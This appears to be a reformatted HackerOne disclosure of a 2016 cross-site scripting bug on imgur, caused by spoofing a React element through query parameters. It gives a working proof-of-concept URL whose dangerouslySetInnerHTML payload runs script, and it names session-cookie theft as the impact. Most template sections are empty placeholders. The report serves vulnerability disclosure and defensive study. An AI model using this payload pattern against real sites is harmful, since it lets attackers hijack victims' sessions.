# XSS via React element spoofing

## Metadata
- **Source:** HackerOne
- **Report:** 124277 | https://hackerone.com/reports/124277
- **Submitted:** 2016-03-18
- **Reporter:** jouko
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello, I noticed an XSS on imgur. Proof of concept: visit the URL

http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22alert(%27XSS%20on%20%27%2bdocument.domain)%22%3E&error[_isReactElement]=true&error[type]=body

It's not the simplest case as it requires some React magic. There is a good explanation of this type of vulnerabilities at h

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello, I noticed an XSS on imgur. Proof of concept: visit the URL

http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22alert(%27XSS%20on%20%27%2bdocument.domain)%22%3E&error[_isReactElement]=true&error[type]=body

It's not the simplest case as it requires some React magic. There is a good explanation of this type of vulnerabilities at http://danlec.com/blog/xss-via-a-spoofed-react-element . Corresponding H1 report: https://hackerone.com/reports/49652 .

The impact is as usual. The attacker could execute operations on behalf of the victim who visits a malicious link, or access e.g. the session cookie (IMGURSESSION).

I haven't yet checked if this the only such occurrence on Imgur.


</details>

---
*Analysed by Claude on 2026-05-24*
